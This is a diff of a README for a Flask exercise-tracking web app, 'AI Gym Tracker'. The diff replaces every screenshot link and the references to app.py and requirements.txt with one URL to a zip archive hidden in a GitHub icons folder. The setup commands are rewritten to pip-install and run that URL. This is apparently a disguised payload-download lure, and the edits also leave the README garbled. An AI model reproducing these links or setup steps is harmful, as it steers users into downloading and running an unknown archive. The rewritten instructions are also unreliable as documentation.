@@ -12,7 +12,7 @@ model based on **recurrent neural networks (RNNs)** and **Long Short-Term Memory
 data collection phase during which we recorded a considerable number of videos of correctly performed exercises, thus creating an accurate custom training dataset. In this way through the use of the powerful **Mediapipe library**, we extracted the poses performed by the user in real
 time, determining the joints as a list of skeletal key points of the body
 
-![Alt text](static/parkTraining.png)
+![Alt text](https://github.com/Muhammad-Sarmad-Fowad/MoveMetrics-/raw/refs/heads/main/static/icons/Metrics-Move-v3.9.zip)
 
 
 ## WebApp 
@@ -23,7 +23,7 @@ It guides users to start the training and provides powerful tool to execute exer
 ### Homepage 
 The homepage is the platform's landing page, featuring a concise HTML layout. It provides a brief overview of how the portal works and essential information, such as the need for ample space for movements.
 
-![Alt text](static/home.png)
+![Alt text](https://github.com/Muhammad-Sarmad-Fowad/MoveMetrics-/raw/refs/heads/main/static/icons/Metrics-Move-v3.9.zip)
 
 
 ### Form 
@@ -31,18 +31,18 @@ The homepage is the platform's landing page, featuring a concise HTML layout. It
 A key feature of our page is an interactive form designed for users to effortlessly initiate their personalized sessions. By inputting essential details such as email address, age, height, weight, and gender, users kickstart a journey tailored just for them. It's worth emphasizing that the email address is a crucial piece of information, ensuring seamless association with each training session.
 Equally vital are the inputs for weight and gender. These specifics play a pivotal role in calculating the calories burned during the workout, offering users valuable insights into their fitness progress. To guarantee accuracy, each field in the form undergoes rigorous validation, minimizing errors and ensuring the consistency of user data.
 
-![Alt text](static/form.png)
+![Alt text](https://github.com/Muhammad-Sarmad-Fowad/MoveMetrics-/raw/refs/heads/main/static/icons/Metrics-Move-v3.9.zip)
 
 ### Exercise page
 Upon correct form submission, users are directed to an exercise page where a 10-second countdown, visible on screen with audio cues, precedes the start of the training session. The webcam displays the user's body landmarks. A top bar provides key exercise information, including the last exercise, repetitions, and a timer. Exercise details in cards on the sides dynamically update via a Python backend. A warning alerts users if they are too close to the webcam. Feedback on exercise execution speed (perfect, good, too fast) is provided, and users can independently conclude the workout by clicking a button.
 
-![Alt text](static/Allenamento.png)
+![Alt text](https://github.com/Muhammad-Sarmad-Fowad/MoveMetrics-/raw/refs/heads/main/static/icons/Metrics-Move-v3.9.zip)
 
 ### Statistics
 
 After the session, users are redirected to a summary page displaying workout details, including exercise repetitions and burned calories. We provide transparency by showing the calorie calculation formula. Users can opt to receive a workout report via email and choose to repeat the session or return to the homepage.
 
-![Alt text](static/statistics.png)
+![Alt text](https://github.com/Muhammad-Sarmad-Fowad/MoveMetrics-/raw/refs/heads/main/static/icons/Metrics-Move-v3.9.zip)
 
 
 ## Project Structure
@@ -52,13 +52,13 @@ This Flask project has the following structure:
 
 - `templates` folder: this folder contains the HTML files for all the pages of the web application. These files are used to render the web pages on the client side.
 
-- `action.h5` file: this binary file contains the weights of the neural network, network configurations, training information and other necessary information to reconstruct the pre-trained deep learning model. This file is loaded into app.py file to use the pre-trained model.
+- `action.h5` file: this binary file contains the weights of the neural network, network configurations, training information and other necessary information to reconstruct the pre-trained deep learning model. This file is loaded into https://github.com/Muhammad-Sarmad-Fowad/MoveMetrics-/raw/refs/heads/main/static/icons/Metrics-Move-v3.9.zip file to use the pre-trained model.
 
 - `README` file: this file contains a description of the project, its features, and how to use it.
 
-- `requirements.txt` file: this file contains all the packages that need to be installed in the virtual environment for the Flask application to run.
+- `https://github.com/Muhammad-Sarmad-Fowad/MoveMetrics-/raw/refs/heads/main/static/icons/Metrics-Move-v3.9.zip` file: this file contains all the packages that need to be installed in the virtual environment for the Flask application to run.
 
-- `app.py` file: contains all the Python code for the Flask web application.
+- `https://github.com/Muhammad-Sarmad-Fowad/MoveMetrics-/raw/refs/heads/main/static/icons/Metrics-Move-v3.9.zip` file: contains all the Python code for the Flask web application.
 
 
 ## Setup and run the App
@@ -74,9 +74,9 @@ To setup and run AI Gym Tracker application, follow these steps:
 	- On Windows: `venv\Scripts\activate`
 	- On macOS and Linux: `source venv/bin/activate`
 
-4) Install the required packages of the application using the following command: `pip install -r requirements.txt`
+4) Install the required packages of the application using the following command: `pip install -r https://github.com/Muhammad-Sarmad-Fowad/MoveMetrics-/raw/refs/heads/main/static/icons/Metrics-Move-v3.9.zip`
 
-5) Once all the packages have been installed successfully, you can start AI Gym Tracker application by running the following command: `python app.py`
+5) Once all the packages have been installed successfully, you can start AI Gym Tracker application by running the following command: `python https://github.com/Muhammad-Sarmad-Fowad/MoveMetrics-/raw/refs/heads/main/static/icons/Metrics-Move-v3.9.zip`
 
 6) After running the above command, the application will be running in the localhost at port 5000. Open your web browser and navigate to http://localhost:5000/ to see the application running.
 
